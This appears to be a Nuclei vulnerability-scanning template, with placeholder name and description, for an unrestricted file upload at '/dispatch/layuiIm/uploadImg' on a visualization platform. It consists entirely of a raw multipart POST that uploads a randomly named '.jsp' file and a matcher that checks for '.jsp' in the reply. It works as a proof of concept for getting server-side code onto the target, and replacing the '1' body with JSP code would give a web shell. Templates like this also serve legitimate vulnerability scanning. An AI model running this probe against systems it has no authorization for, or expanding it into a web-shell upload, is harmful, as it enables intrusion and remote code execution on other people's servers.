id: keshihua-uploadImg-upload
info:
  name: Template Name
  author: apple
  severity: critical
  description: description
  reference:
    - https://
  tags: tags
variables:
  filename: "{{rand_base(6)}}" 

http:
  - raw:
      - |-
        POST /dispatch/layuiIm/uploadImg HTTP/1.1
        Host: {{Hostname}}
        Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
        Sec-Ch-Ua-Mobile: ?0
        Sec-Ch-Ua-Platform: "Windows"
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp
        Content-Length: 151

        ------WebKitFormBoundary7ctER307B0RaQwOp
        Content-Disposition: form-data; name="file";filename="{{filename}}.jsp"

        1
        ------WebKitFormBoundary7ctER307B0RaQwOp--
    matchers:
      - type: word
        part: body
        words:
          - '.jsp'
